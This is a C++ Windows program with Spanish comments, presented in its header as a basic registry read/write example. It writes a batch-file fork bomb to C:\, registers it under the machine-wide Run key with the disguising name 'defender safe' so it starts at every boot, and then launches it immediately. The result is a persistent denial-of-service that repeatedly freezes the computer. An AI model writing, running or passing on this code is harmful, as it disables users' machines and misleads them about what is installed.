//Basic read and write from Windows Registry. Be careful ! You modify the registry at your own risk !
//Przemyslaw Zaworski, 2017

#include <windows.h>
#include <iostream>
#include <fstream>
#include <winreg.h>
#include <cstdlib>
#include < direct.h>
#include <sys/stat.h>
#include <sys/types.h>

int main() {
    // Comprobar si el fichero batch existe
    std::ifstream file("C:/file.bat");//comprobacion de existencia del fichero

    if (!file) {
        std::cout << "El fichero no existe. Creando fichero fjgjgjg.bat." << std::endl;
        char* username = nullptr;
        size_t size = 0;
        if (_dupenv_s(&username, &size, "USERNAME") == 0 && username != nullptr) {
            // Construct the file path
            //std::string path = "C:/Users/";
            //path += username;
            //path += "/Documents/programacion/c++/file.bat";
            
            std::ofstream fich("c:/file.bat");//creacion fichero en c
            fich << ":s\nstart %0\ngoto s";//añadido contenido fichero
            fich.close();
            //std::cout << "Fichero creado en: " << path << std::endl;
            //std::string path2 = "cmd.exe /";//1º parte comando ejecucion fichero
           // std::string path3 = path2 + path;//union partes
            //const char* finalpath = path3.c_str();//convertir string
            //std::cout << finalpath;
            
            free(username); // Liberar la memoria asignada por _dupenv_s
        }
    }
    else {
        std::cout << "El fichero ya existe." << std::endl;
    }





    //editar registro, arrancar al inicio
    char* username = nullptr;
    size_t size = 0;
    if (_dupenv_s(&username, &size, "USERNAME") == 0 && username != nullptr) {
        // Construct the file path
        //std::string path = "C:/Users/";
        //path += username;
        //path += "/Documents/programacion/c++/file.bat";
        std::string path = "c:/file.bat";
    

        HKEY hKey;
        LPCSTR regPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        LPCSTR valueName = "defender safe";
        LPCSTR valueData = path.c_str();

        // Open the key
        LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey);

        if (result == ERROR_SUCCESS) {
            // Set the value
            result = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)valueData, strlen(valueData) + 1);

            if (result == ERROR_SUCCESS) {
                std::cout << "Successfully set the registry key!" << std::endl;
            }
            else {
                std::cerr << "Error setting the registry key: " << result << std::endl;
            }

            // Close the key
            RegCloseKey(hKey);
            system("c:/file.bat");//ejecutar fichero
        }
        else {
            std::cerr << "Error opening the registry key: " << result << std::endl;
        }
        free(username);
        return 0;
    }
    else {
        std::cerr << "Error obtaining username." << std::endl;
        return 2;
    }
    
}